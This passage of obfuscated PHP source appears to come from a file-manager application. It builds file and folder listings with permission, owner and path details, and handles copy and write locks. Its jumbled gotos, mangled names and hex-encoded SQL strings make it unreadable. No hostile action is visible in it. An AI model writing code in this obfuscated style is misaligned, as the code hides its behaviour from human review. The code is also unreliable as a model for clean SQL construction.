$dÎ‚æÖíó = array_to_keyvalue_group($F°·† ØÁ¬, $fîøîÍĞ‘ï[387]); foreach ($bèáŸÍê¥ as &$Aª»Ñœ‹È) { $Aª»Ñœ‹È[$fîøîÍĞ‘ï[84]] = array($fîøîÍĞ‘ï[446] => 0, $fîøîÍĞ‘ï[447] => 0, $fîøîÍĞ‘ï[448] => 0); if (isset($A£•ƒ‚æ¢ˆ[$Aª»Ñœ‹È[$fîøîÍĞ‘ï[387]]])) { $Aª»Ñœ‹È[$fîøîÍĞ‘ï[84]][$fîøîÍĞ‘ï[449]] = 1; $Aª»Ñœ‹È[$fîøîÍĞ‘ï[84]][$fîøîÍĞ‘ï[450]] = $A£•ƒ‚æ¢ˆ[$Aª»Ñœ‹È[$fîøîÍĞ‘ï[387]]][$fîøîÍĞ‘ï[28]]; } if (isset($E§°Œœ«¥[$Aª»Ñœ‹È[$fîøîÍĞ‘ï[387]]])) { $Aª»Ñœ‹È[$fîøîÍĞ‘ï[84]][$fîøîÍĞ‘ï[451]] = array(); foreach ($E§°Œœ«¥[$Aª»Ñœ‹È[$fîøîÍĞ‘ï[387]]] as $FÍ³ÉÉŸš) { $e÷ƒ‘³Ü“Ï = $F‰ùÌ™ëƒ[$FÍ³ÉÉŸš]; $Aª»Ñœ‹È[$fîøîÍĞ‘ï[84]][$fîøîÍĞ‘ï[451]][] = array($fîøîÍĞ‘ï[452] => $e÷ƒ‘³Ü“Ï[$fîøîÍĞ‘ï[385]], $fîøîÍĞ‘ï[404] => $e÷ƒ‘³Ü“Ï[$fîøîÍĞ‘ï[28]], $fîøîÍĞ‘ï[453] => $e÷ƒ‘³Ü“Ï[$fîøîÍĞ‘ï[454]]); } } if (isset($dÎ‚æÖíó[$Aª»Ñœ‹È[$fîøîÍĞ‘ï[387]]])) { $Aª»Ñœ‹È[$fîøîÍĞ‘ï[84]][$fîøîÍĞ‘ï[455]] = array(); foreach ($dÎ‚æÖíó[$Aª»Ñœ‹È[$fîøîÍĞ‘ï[387]]] as $Aá„¶µÏé¿) { $Aª»Ñœ‹È[$fîøîÍĞ‘ï[84]][$fîøîÍĞ‘ï[455]] = array($fîøîÍĞ‘ï[456] => $Aá„¶µÏé¿[$fîøîÍĞ‘ï[457]], $fîøîÍĞ‘ï[458] => $Aá„¶µÏé¿[$fîøîÍĞ‘ï[459]], $fîøîÍĞ‘ï[460] => $Aá„¶µÏé¿[$fîøîÍĞ‘ï[387]], $fîøîÍĞ‘ï[461] => $Aá„¶µÏé¿[$fîøîÍĞ‘ï[462]], $fîøîÍĞ‘ï[463] => $Aá„¶µÏé¿[$fîøîÍĞ‘ï[464]], $fîøîÍĞ‘ï[465] => $Aá„¶µÏé¿[$fîøîÍĞ‘ï[465]], $fîøîÍĞ‘ï[466] => $Aá„¶µÏé¿[$fîøîÍĞ‘ï[466]]); } } } unset($Aª»Ñœ‹È); goto cÛÙ¬Ôø¹; c˜Õ‚Í“Ïö: } protected function _listAppendChildren(&$eáƒ½¤ÖªÙ, $C §¦ÛŒÊØ) { goto e§‘ÛÑæÃö; eÛ…ù¤”Èø: $c­Äé˜ªŒ = $this->tablePrefix . $this->tableName; for ($Bğª‹¬…‘º = 0; $Bğª‹¬…‘º < $fÇø×¶¯îº; $Bğª‹¬…‘º++) { $FÙ–ãÚíó´ = intval($eáƒ½¤ÖªÙ[$Bğª‹¬…‘º][$CµÙó¸¯‚±[414]]); if ($eáƒ½¤ÖªÙ[$Bğª‹¬…‘º][$CµÙó¸¯‚±[388]]) { $f¸ÕñîªÛô = $eáƒ½¤ÖªÙ[$Bğª‹¬…‘º][$CµÙó¸¯‚±[387]]; $DèÈ°Ï™†¶ .= "\123\105\x4c\x45\x43\x54\x20\x2a\x20\106\x52\117\115\x20\50\x53\x45\114\105\103\x54\x20\x27{$f¸ÕñîªÛô}\x5f\x68\x61\x73\x46\x69\154\145\47\x20\141\x73\40\x68\141\163\x2c\x63\x6f\x75\x6e\x74\x28\x31\x29\40\x61\x73\40\x68\x61\x73\103\157\165\156\x74\x20\106\x52\117\115\x20\140{$c­Äé˜ªŒ}\140\40\12\x9\11\x9\11\x9\167\150\x65\162\145\40\x70\x61\x72\145\x6e\x74\111\x44\75{$f¸ÕñîªÛô}\40\141\156\x64\40\x69\163\106\157\154\x64\145\162\75\x30\x20\141\156\144\x20\x69\163\104\145\x6c\145\x74\145\x3d{$FÙ–ãÚíó´}\x29\x20\x61\x73\40\x74\x62\61\x5f{$f¸ÕñîªÛô}\x20\165\156\x69\157\156\40\141\x6c\x6c\x20\xa\x9\11\11\x9\11\123\105\x4c\x45\103\124\40\52\40\106\122\x4f\x4d\40\50\123\x45\x4c\105\x43\x54\x20\x27{$f¸ÕñîªÛô}\x5f\x68\141\x73\x46\x6f\154\144\145\x72\x27\x20\141\163\40\x68\141\163\106\151\154\145\x2c\x63\157\x75\x6e\164\50\x31\51\40\x61\163\x20\150\x61\163\x43\157\165\156\164\x20\106\122\x4f\115\40\x60{$c­Äé˜ªŒ}\140\40\12\x9\x9\x9\11\x9\167\x68\x65\x72\145\40\160\141\162\x65\x6e\x74\x49\104\x3d{$f¸ÕñîªÛô}\40\x61\x6e\144\x20\x69\163\x46\x6f\x6c\144\145\x72\75\x31\40\141\156\x64\x20\x69\163\104\145\154\145\x74\x65\x3d{$FÙ–ãÚíó´}\x29\40\141\x73\x20\164\142\x32\x5f{$f¸ÕñîªÛô}\x20\x75\x6e\151\x6f\156\40\x61\154\x6c\x20"; } if ((strlen($DèÈ°Ï™†¶) >= $bÃÀ¥¨œ– || $Bğª‹¬…‘º == $fÇø×¶¯îº - 1) && $DèÈ°Ï™†¶) { $DèÈ°Ï™†¶ = substr($DèÈ°Ï™†¶, 0, -strlen($CµÙó¸¯‚±[467])); $DâÒÒÎóÁ = $this->query($DèÈ°Ï™†¶); $C¢œ¶Ëããë = array_merge($C¢œ¶Ëããë, $DâÒÒÎóÁ); $DèÈ°Ï™†¶ = $CµÙó¸¯‚±[33]; } } $C¢œ¶Ëããë = array_to_keyvalue($C¢œ¶Ëããë, $CµÙó¸¯‚±[468]); goto cÖÚ¶ÑÙÈ¨; d²éÖå—Õ”: $bÃÀ¥¨œ– = 1024 * 50; $eáƒ½¤ÖªÙ = is_array($eáƒ½¤ÖªÙ) ? $eáƒ½¤ÖªÙ : array(); $fÇø×¶¯îº = count($eáƒ½¤ÖªÙ); goto eÛ…ù¤”Èø; cÖÚ¶ÑÙÈ¨: foreach ($eáƒ½¤ÖªÙ as &$b»ªìÛÜ“) { if ($b»ªìÛÜ“[$CµÙó¸¯‚±[388]]) { unset($b»ªìÛÜ“[$CµÙó¸¯‚±[390]]); $b»ªìÛÜ“[$CµÙó¸¯‚±[202]] = intval($C¢œ¶Ëããë[$b»ªìÛÜ“[$CµÙó¸¯‚±[387]] . $CµÙó¸¯‚±[469]][$CµÙó¸¯‚±[470]]); $b»ªìÛÜ“[$CµÙó¸¯‚±[201]] = intval($C¢œ¶Ëããë[$b»ªìÛÜ“[$CµÙó¸¯‚±[387]] . $CµÙó¸¯‚±[471]][$CµÙó¸¯‚±[470]]); } } unset($b»ªìÛÜ“); goto EëğöˆØš©; e§‘ÛÑæÃö: $CµÙó¸¯‚± =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DèÈ°Ï™†¶ = $CµÙó¸¯‚±[370]; $C¢œ¶Ëããë = array(); goto d²éÖå—Õ”; EëğöˆØš©: } protected function _listAppendAuth(&$Eôø——­ß) { goto D¨ÏŞë¹Åº; fºŒ‘ãß«: foreach ($Eôø——­ß as $fä±ñŸ©Ÿ) { if ($fä±ñŸ©Ÿ[$E¸ÈêºÏïã[389]] == self::TYPE_GROUP) { $DªóäÁç°Ø[] = $fä±ñŸ©Ÿ[$E¸ÈêºÏïã[387]]; } } if (!$DªóäÁç°Ø) { return; } $bâÅøºà = array_to_keyvalue($Eôø——­ß, $E¸ÈêºÏïã[387]); goto E®°ÈøÂ¯„; D¨ÏŞë¹Åº: $E¸ÈêºÏïã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!defined($E¸ÈêºÏïã[443])) { return; } $DªóäÁç°Ø = array(); goto fºŒ‘ãß«; E®°ÈøÂ¯„: $bêŠ½˜…‘ = Model($E¸ÈêºÏïã[472])->getSourceList($DªóäÁç°Ø, $bâÅøºà); foreach ($Eôø——­ß as $d­—ÙÙùÙÃ => &$fä±ñŸ©Ÿ) { $fä±ñŸ©Ÿ[$E¸ÈêºÏïã[394]] = $bêŠ½˜…‘[$fä±ñŸ©Ÿ[$E¸ÈêºÏïã[387]]]; if (!$fä±ñŸ©Ÿ[$E¸ÈêºÏïã[394]] && $fä±ñŸ©Ÿ[$E¸ÈêºÏïã[389]] == self::TYPE_GROUP) { $fä±ñŸ©Ÿ[$E¸ÈêºÏïã[394]] = Action($E¸ÈêºÏïã[473])->pathGroupAuthMake($fä±ñŸ©Ÿ[$E¸ÈêºÏïã[474]]); if (!$fä±ñŸ©Ÿ[$E¸ÈêºÏïã[394]] && !_get($GLOBALS, $E¸ÈêºÏïã[475])) { $fä±ñŸ©Ÿ[$E¸ÈêºÏïã[194]] = !1; $fä±ñŸ©Ÿ[$E¸ÈêºÏïã[193]] = !1; } } if ($fä±ñŸ©Ÿ[$E¸ÈêºÏïã[394]]) { $fä±ñŸ©Ÿ[$E¸ÈêºÏïã[194]] = AuthModel::authCheckEdit($fä±ñŸ©Ÿ[$E¸ÈêºÏïã[394]][$E¸ÈêºÏïã[395]]); $fä±ñŸ©Ÿ[$E¸ÈêºÏïã[193]] = AuthModel::authCheckView($fä±ñŸ©Ÿ[$E¸ÈêºÏïã[394]][$E¸ÈêºÏïã[395]]); } $this->groupPathDisplay($fä±ñŸ©Ÿ); } unset($fä±ñŸ©Ÿ); goto b³Í¬Ê»¹Œ; b³Í¬Ê»¹Œ: } public function groupPathDisplay(&$e”ÔÊÀèá‹) { goto b°¿İÌ›Ì; b°¿İÌ›Ì: $C²­Î•â‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($e”ÔÊÀèá‹[$C²­Î•â‘[389]] != self::TYPE_GROUP) { return; } $eäœí›Ûô = Model($C²­Î•â‘[476])->getInfo($e”ÔÊÀèá‹[$C²­Î•â‘[474]]); goto dëÆ¬‹—ÇÖ; dëÆ¬‹—ÇÖ: $fëæëñ’‘î = $this->parentLevelArray($eäœí›Ûô[$C²­Î•â‘[477]]); $c“Ã—¸±ÕÑ = $C²­Î•â‘[33]; foreach ($fëæëñ’‘î as $E¾Ä•·³ä) { $EÜ õöÒã¹ = Model($C²­Î•â‘[476])->getInfo($E¾Ä•·³ä); $c“Ã—¸±ÕÑ .= $EÜ õöÒã¹[$C²­Î•â‘[84]][$C²­Î•â‘[387]] . $C²­Î•â‘[47]; } goto BÉ¯ø×ÃÂç; FõÀ”“‘•–: $e”ÔÊÀèá‹[$C²­Î•â‘[482]] = $c“Ã—¸±ÕÑ . $eäœí›Ûô[$C²­Î•â‘[84]][$C²­Î•â‘[387]]; goto DÚ±÷Á¨¾; BÉ¯ø×ÃÂç: $e”ÔÊÀèá‹[$C²­Î•â‘[478]] = $eäœí›Ûô[$C²­Î•â‘[479]]; $e”ÔÊÀèá‹[$C²­Î•â‘[398]] = $eäœí›Ûô[$C²­Î•â‘[477]]; $e”ÔÊÀèá‹[$C²­Î•â‘[480]] = $eäœí›Ûô[$C²­Î•â‘[481]]; goto FõÀ”“‘•–; DÚ±÷Á¨¾: } protected function _listAppendPath(&$D‹Ş”¹Ÿô£) { goto cÆ†±ëª•; bà»Œ“ÁÀğ: return $D‹Ş”¹Ÿô£; goto DŒË®ÉäŞÍ; Dïªìß¶‚•: $fãã˜ÇÛó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($D‹Ş”¹Ÿô£ as &$aÛ¨¼³ÅÛ‹) { goto E¼³ÀÀƒö; dËñÅÔ“Ò: if ($CÍÊ‚¾–Œ‹) { $E¶§½ñè¾ .= $aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[28]]; } if ($aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[388]]) { $E¶§½ñè¾ .= $dùœ‡»ßÌ[8]; } $aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[484]] = str_replace($dùœ‡»ßÌ[485], $dùœ‡»ßÌ[8], $E¶§½ñè¾); goto D£†Ê•Ä×Ì; E¼³ÀÀƒö: $CÍÊ‚¾–Œ‹ = $this->parentLevelArray($aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[477]]); $E¶§½ñè¾ = $this->_listAppendPathRoot($aÛ¨¼³ÅÛ‹, $CÍÊ‚¾–Œ‹); foreach ($CÍÊ‚¾–Œ‹ as $F‰ÒÓÑÄ—Â => $F¾ÛßÔ›ğ) { if ($F‰ÒÓÑÄ—Â == 0 && $E¶§½ñè¾ && $aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[389]] == self::TYPE_GROUP) { continue; } if (isset($Fãà²ÔÌÁÒ[$F¾ÛßÔ›ğ])) { $E¶§½ñè¾ .= $Fãà²ÔÌÁÒ[$F¾ÛßÔ›ğ] . $dùœ‡»ßÌ[8]; } } goto dËñÅÔ“Ò; D£†Ê•Ä×Ì: $A×ŠÕ¹ø¾Ë = trim($aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[484]], $dùœ‡»ßÌ[8]); if ($aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[479]] == $dùœ‡»ßÌ[486] && $A×ŠÕ¹ø¾Ë) { $aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[28]] = $A×ŠÕ¹ø¾Ë; } $this->_listAppendPathRecycle($aÛ¨¼³ÅÛ‹, $CÍÊ‚¾–Œ‹, $fãã˜ÇÛó); goto DÕŠÚ‚Óäã; DÕŠÚ‚Óäã: } unset($aÛ¨¼³ÅÛ‹); goto bà»Œ“ÁÀğ; cÆ†±ëª•: $dùœ‡»ßÌ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; static $Fãà²ÔÌÁÒ = array(); $f‡‡ÜÛ®Í‰ = array(); goto AŞÌÖ¦ÏĞ; AŞÌÖ¦ÏĞ: foreach ($D‹Ş”¹Ÿô£ as &$aÛ¨¼³ÅÛ‹) { $Fãà²ÔÌÁÒ[$aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[387]]] = $aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[28]]; $CÍÊ‚¾–Œ‹ = $this->parentLevelArray($aÛ¨¼³ÅÛ‹[$dùœ‡»ßÌ[477]]); foreach ($CÍÊ‚¾–Œ‹ as $F‰ÒÓÑÄ—Â => $F¾ÛßÔ›ğ) { if ($F‰ÒÓÑÄ—Â != 0 && !isset($Fãà²ÔÌÁÒ[$F¾ÛßÔ›ğ])) { $f‡‡ÜÛ®Í‰[] = $F¾ÛßÔ›ğ; } } } unset($aÛ¨¼³ÅÛ‹); if (count($f‡‡ÜÛ®Í‰) > 0) { $eñÉßÀù„ = array($dùœ‡»ßÌ[401] => array($dùœ‡»ßÌ[402], $f‡‡ÜÛ®Í‰)); if (count($f‡‡ÜÛ®Í‰) == 1) { $b…ÜÛÏíÀø = $this->sourceInfo($f‡‡ÜÛ®Í‰[0]); $bù·ƒÑ³Šå = is_array($b…ÜÛÏíÀø) ? array($b…ÜÛÏíÀø) : !1; } else { $bù·ƒÑ³Šå = $this->field($dùœ‡»ßÌ[483])->where($eñÉßÀù„)->select(); } $bùÃöÉ¼Ş³ = array_to_keyvalue($bù·ƒÑ³Šå, $dùœ‡»ßÌ[387], $dùœ‡»ßÌ[28]); $Fãà²ÔÌÁÒ = array_merge_index($Fãà²ÔÌÁÒ, $bùÃöÉ¼Ş³); } goto Dïªìß¶‚•; DŒË®ÉäŞÍ: } private function _listAppendPathRecycle(&$Cªø‚òç¯, $C¬ÎÊ‘ÌŞß, $B÷äİìå±Ü) { goto aæ±ˆñóëª; f©Ğ¬™ºÍÏ: $Cªø‚òç¯[$fŞéÌ±è­[477]] = $fŞéÌ±è­[488] . implode($fŞéÌ±è­[47], array_slice($C¬ÎÊ‘ÌŞß, 1)) . $fŞéÌ±è­[47]; if ($Cªø‚òç¯[$fŞéÌ±è­[387]] == $B÷äİìå±Ü) { $Cªø‚òç¯[$fŞéÌ±è­[477]] = $fŞéÌ±è­[488]; $Cªø‚òç¯[$fŞéÌ±è­[479]] = $fŞéÌ±è­[486]; $Cªø‚òç¯[$fŞéÌ±è­[28]] = LNG($fŞéÌ±è­[487]); } $Cªø‚òç¯[$fŞéÌ±è­[489]] = $fŞéÌ±è­[490]; goto DÑï¤¼õê; aæ±ˆñóëª: $fŞéÌ±è­ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (intval($Cªø‚òç¯[$fŞéÌ±è­[389]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($B÷äİìå±Ü, $C¬ÎÊ‘ÌŞß) && $Cªø‚òç¯[$fŞéÌ±è­[387]] != $B÷äİìå±Ü) { return; } goto aÛ­×ê¾°ì; aÛ­×ê¾°ì: $c±ÄÂù¾° = explode($fŞéÌ±è­[8], trim($Cªø‚òç¯[$fŞéÌ±è­[484]], $fŞéÌ±è­[8])); $dª’¶îø„É = implode($fŞéÌ±è­[8], array_slice($c±ÄÂù¾°, 2)); $Cªø‚òç¯[$fŞéÌ±è­[484]] = $fŞéÌ±è­[8] . LNG($fŞéÌ±è­[487]) . $fŞéÌ±è­[8] . ltrim($dª’¶îø„É, $fŞéÌ±è­[8]); goto f©Ğ¬™ºÍÏ; DÑï¤¼õê: } protected function _listAppendPathRoot(&$AØÙœˆŞòŠ, $d‘âêŒÎ¹í) { $AÙä­Úõí =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Bì²„öªÎ¨ = $AÙä­Úõí[33]; if ($AØÙœˆŞòŠ[$AÙä­Úõí[389]] == self::TYPE_USER) { if (defined($AÙä­Úõí[443]) && $AØÙœˆŞòŠ[$AÙä­Úõí[474]] == USER_ID) { $Bì²„öªÎ¨ = LNG($AÙä­Úõí[491]); if (!$d‘âêŒÎ¹í) { $AØÙœˆŞòŠ[$AÙä­Úõí[28]] = $Bì²„öªÎ¨; } } else { $b¨…ôíÄã¸ = Model($AÙä­Úõí[492])->getInfoSimple($AØÙœˆŞòŠ[$AÙä­Úõí[474]]); $Bì²„öªÎ¨ = LNG($AÙä­Úõí[493]) . $AÙä­Úõí[159] . $b¨…ôíÄã¸[$AÙä­Úõí[28]] . $AÙä­Úõí[494]; } } else { if ($AØÙœˆŞòŠ[$AÙä­Úõí[389]] == self::TYPE_GROUP) { $b¨…ôíÄã¸ = Model($AÙä­Úõí[476])->getInfoSimple($AØÙœˆŞòŠ[$AÙä­Úõí[474]]); $Bì²„öªÎ¨ = $b¨…ôíÄã¸[$AÙä­Úõí[28]]; } else { if ($AØÙœˆŞòŠ[$AÙä­Úõí[389]] == self::TYPE_SYSTEM) { $b¨…ôíÄã¸ = $this->sourceInfo($d‘âêŒÎ¹í[0], !0); $Bì²„öªÎ¨ = $b¨…ôíÄã¸[$AÙä­Úõí[28]]; } } } $Bì²„öªÎ¨ = $Bì²„öªÎ¨ ? $AÙä­Úõí[8] . $Bì²„öªÎ¨ . $AÙä­Úõí[8] : $AÙä­Úõí[8]; return $Bì²„öªÎ¨; } protected function _listAppendUser(&$Eƒ‹•Ê‹ù“) { goto E÷‘ğ¯ƒ°ô; E÷‘ğ¯ƒ°ô: $eŒ«‚Ö–Éö =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Cäóâà¼ëº = array_to_keyvalue($Eƒ‹•Ê‹ù“, $eŒ«‚Ö–Éö[33], $eŒ«‚Ö–Éö[396]); $BÅ®õñÉä¾ = array_to_keyvalue($Eƒ‹•Ê‹ù“, $eŒ«‚Ö–Éö[33], $eŒ«‚Ö–Éö[397]); goto c²²«©ÛòÏ; c²²«©ÛòÏ: $aòäâÊñ¾Ñ = array_merge($Cäóâà¼ëº, $BÅ®õñÉä¾); $fĞ›ºèê”º = Model($eŒ«‚Ö–Éö[495])->userListInfo($aòäâÊñ¾Ñ); foreach ($Eƒ‹•Ê‹ù“ as &$EÁóÁÚÖ…ß) { $bÃÑÖ‚³ = $EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[396]]; $EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[396]] = $fĞ›ºèê”º[$bÃÑÖ‚³] ? $fĞ›ºèê”º[$bÃÑÖ‚³] : !1; $bÃÑÖ‚³ = $EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[397]]; $EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[397]] = $fĞ›ºèê”º[$bÃÑÖ‚³] ? $fĞ›ºèê”º[$bÃÑÖ‚³] : !1; if (isset($EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[434]]) && $EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[434]][$eŒ«‚Ö–Éö[496]]) { $cÑİÒ¶ÄÈ = $GLOBALS[$eŒ«‚Ö–Éö[6]][$eŒ«‚Ö–Éö[87]][$eŒ«‚Ö–Éö[497]]; if ($EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[434]][$eŒ«‚Ö–Éö[498]] <= time() - $cÑİÒ¶ÄÈ) { $this->metaSet($EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[387]], $eŒ«‚Ö–Éö[496], null); $this->metaSet($EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[387]], $eŒ«‚Ö–Éö[498], null); unset($EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[434]][$eŒ«‚Ö–Éö[496]]); continue; } $fòÌ Å«‚é = $EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[434]][$eŒ«‚Ö–Éö[496]]; $EÁóÁÚÖ…ß[$eŒ«‚Ö–Éö[434]][$eŒ«‚Ö–Éö[499]] = Model($eŒ«‚Ö–Éö[495])->getInfoSimpleOuter($fòÌ Å«‚é); } } goto aÒñ¤¯ï; aÒñ¤¯ï: unset($EÁóÁÚÖ…ß); goto cÀ«…Š¿‡Ö; cÀ«…Š¿‡Ö: } public function parentLevelArray($d©õ†çÀóˆ) { $f—æÔ‰ŠíÔ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d©õ†çÀóˆ = explode($f—æÔ‰ŠíÔ[47], trim($d©õ†çÀóˆ, $f—æÔ‰ŠíÔ[47])); return array_remove_value($d©õ†çÀóˆ, $f—æÔ‰ŠíÔ[486]); } public function listAll($F÷‹¨“ˆÎ) { goto EÆ¢÷÷ªËƒ; aÄÊË´œ: $B©Ñ§‡ß”¹ = array_to_keyvalue($B©Ñ§‡ß”¹, $EèŠÉŒÄ‚Ò[387]); $fæ›Å’¼ = "\x2f{$c«Î˜Šğ™£[$EèŠÉŒÄ‚Ò[28]]}\57"; $fæ›Å’¼ = $fæ›Å’¼ == $EèŠÉŒÄ‚Ò[485] ? $EèŠÉŒÄ‚Ò[8] : $fæ›Å’¼; goto E½Ãç«µ¿§; D·»¥ ¾Î: $F²ôÍ‰«¥î = $EèŠÉŒÄ‚Ò[504]; $Aöƒ”®ØŠ = "\x4c\x45\x46\x54\40\x4a\117\111\116\40{$this->tablePrefix}\151\x6f\x5f\x66\x69\154\x65\40\146\151\x6c\145\x20\157\x6e\40\163\x6f\x75\x72\143\x65\56\x66\151\154\x65\x49\104\40\75\40\146\151\154\145\56\146\151\154\x65\111\104"; $B©Ñ§‡ß”¹ = $this->alias($EèŠÉŒÄ‚Ò[505])->field($F²ôÍ‰«¥î)->where($F‡²šË‡ˆ)->join($Aöƒ”®ØŠ)->select(); goto A…ÖÙˆ æä; A…ÖÙˆ æä: $this->_listAppendAuth($B©Ñ§‡ß”¹); $this->_listAppendUser($B©Ñ§‡ß”¹); $this->_listAppendPath($B©Ñ§‡ß”¹); goto aÄÊË´œ; E½Ãç«µ¿§: $B„™ğ´ÇÃ¡ = array(); foreach ($B©Ñ§‡ß”¹ as $cå¬°­ØÛ× => $Eíæà™öàÕ) { goto böÏ„ºŒ; böÏ„ºŒ: $f˜ä™ŒŸ¯œ = $this->parentLevelArray($Eíæà™öàÕ[$EèŠÉŒÄ‚Ò[477]]); array_shift($f˜ä™ŒŸ¯œ); $dÄ§¨Õ†¯Ï = $fæ›Å’¼; goto dÑÙè‡ç›Ô; Eİ¹²‚ììà: $dÄ§¨Õ†¯Ï = str_replace($EèŠÉŒÄ‚Ò[485], $EèŠÉŒÄ‚Ò[8], $dÄ§¨Õ†¯Ï); $dÄ§¨Õ†¯Ï = str_replace($EèŠÉŒÄ‚Ò[485], $EèŠÉŒÄ‚Ò[8], $dÄ§¨Õ†¯Ï); $A‘¥É¢Ê£Ó = array($EèŠÉŒÄ‚Ò[405] => str_replace($EèŠÉŒÄ‚Ò[485], $EèŠÉŒÄ‚Ò[8], $dÄ§¨Õ†¯Ï), $EèŠÉŒÄ‚Ò[506] => intval($Eíæà™öàÕ[$EèŠÉŒÄ‚Ò[388]]), $EèŠÉŒÄ‚Ò[84] => $this->pathInfoFilter($Eíæà™öàÕ, !0)); goto fÖ¸µĞÉî; fÖ¸µĞÉî: if (!$Eíæà™öàÕ[$EèŠÉŒÄ‚Ò[388]]) { $A‘¥É¢Ê£Ó[$EèŠÉŒÄ‚Ò[436]] = $Eíæà™öàÕ[$EèŠÉŒÄ‚Ò[436]]; $A‘¥É¢Ê£Ó[$EèŠÉŒÄ‚Ò[85]] = $Eíæà™öàÕ[$EèŠÉŒÄ‚Ò[75]]; } $B„™ğ´ÇÃ¡[] = $A‘¥É¢Ê£Ó; goto Bá¶…—Îœ; dÑÙè‡ç›Ô: for ($eæéÚËºß“ = 0; $eæéÚËºß“ < count($f˜ä™ŒŸ¯œ); $eæéÚËºß“++) { $dÄ§¨Õ†¯Ï .= $B©Ñ§‡ß”¹[$f˜ä™ŒŸ¯œ[$eæéÚËºß“]][$EèŠÉŒÄ‚Ò[28]] . $EèŠÉŒÄ‚Ò[8]; } $dÄ§¨Õ†¯Ï .= $Eíæà™öàÕ[$EèŠÉŒÄ‚Ò[28]]; if ($Eíæà™öàÕ[$EèŠÉŒÄ‚Ò[388]]) { $dÄ§¨Õ†¯Ï .= $EèŠÉŒÄ‚Ò[8]; } goto Eİ¹²‚ììà; Bá¶…—Îœ: } return $B„™ğ´ÇÃ¡; goto eäè”Á‹ ô; EÆ¢÷÷ªËƒ: $EèŠÉŒÄ‚Ò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c«Î˜Šğ™£ = $this->sourceInfo($F÷‹¨“ˆÎ); $F‡²šË‡ˆ = array($EèŠÉŒÄ‚Ò[500] => array($EèŠÉŒÄ‚Ò[501], $c«Î˜Šğ™£[$EèŠÉŒÄ‚Ò[477]] . $F÷‹¨“ˆÎ . $EèŠÉŒÄ‚Ò[502]), $EèŠÉŒÄ‚Ò[503] => 0); goto D·»¥ ¾Î; eäè”Á‹ ô: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($bÚµ¥µŒª) { goto AÕÆĞ‰¾Šù; a•´©“¤Ø: $CÎëç«ÜÖ = 1; $this->_lockEvent($bÚµ¥µŒª, array($AÙŒ§éù…¿[508], $AÙŒ§éù…¿[509]), $CÎëç«ÜÖ); $this->_lockParent($bÚµ¥µŒª, array($AÙŒ§éù…¿[509]), $CÎëç«ÜÖ); goto a¨á›„; a¨á›„: $this->_lockEvent($bÚµ¥µŒª, array($AÙŒ§éù…¿[510], $AÙŒ§éù…¿[511]), $CÎëç«ÜÖ); $this->_lockCheckEnd($AÙŒ§éù…¿[507], $bÚµ¥µŒª); goto F÷´òºÕ…ƒ; AÕÆĞ‰¾Šù: $AÙŒ§éù…¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->allowLock()) { return; } $this->_lockCheck($AÙŒ§éù…¿[507], $bÚµ¥µŒª); goto a•´©“¤Ø; F÷´òºÕ…ƒ: } public function lockCopyEnd($b‰êÀĞÆ»Ÿ) { $DÉ°Æ³ÉÇ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->allowLock()) { return; } $CÏËÜÚ†‚å = 0; $this->_lockEvent($b‰êÀĞÆ»Ÿ, array($DÉ°Æ³ÉÇ[508], $DÉ°Æ³ÉÇ[509]), $CÏËÜÚ†‚å); $this->_lockParent($b‰êÀĞÆ»Ÿ, array($DÉ°Æ³ÉÇ[509]), $CÏËÜÚ†‚å); $this->_lockEvent($b‰êÀĞÆ»Ÿ, array($DÉ°Æ³ÉÇ[510], $DÉ°Æ³ÉÇ[511]), $CÏËÜÚ†‚å); } public function lockWriteStart($FÌÛ²öšâ„, $fïÙÜ‹î°Ğ = '') { goto CÊ†Òçï·Á; C®Ïèƒ¿•: $this->_lockParent($FÌÛ²öšâ„, array($e¶šª±¤á¸[507], $e¶šª±¤á¸[509]), $D•–ÊŒ˜‘²); $this->_lockCheckEnd($e¶šª±¤á¸[508], $FÌÛ²öšâ„); goto d˜ÓîÔŠœ‹; CÊ†Òçï·Á: $e¶šª±¤á¸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$this->allowLock()) { return; } $this->_lockCheck($e¶šª±¤á¸[508], $FÌÛ²öšâ„); goto C—¶ğâ®öÖ; C—¶ğâ®öÖ: $D•–ÊŒ˜‘² = 1; $this->_lockKey($e¶šª±¤á¸[512] . $FÌÛ²öšâ„ . $e¶šª±¤á¸[94] . $fïÙÜ‹î°Ğ, $D•–ÊŒ˜‘²); $this->_lockEvent($FÌÛ²öšâ„, array($e¶šª±¤á¸[507], $e¶šª±¤á¸[509]), 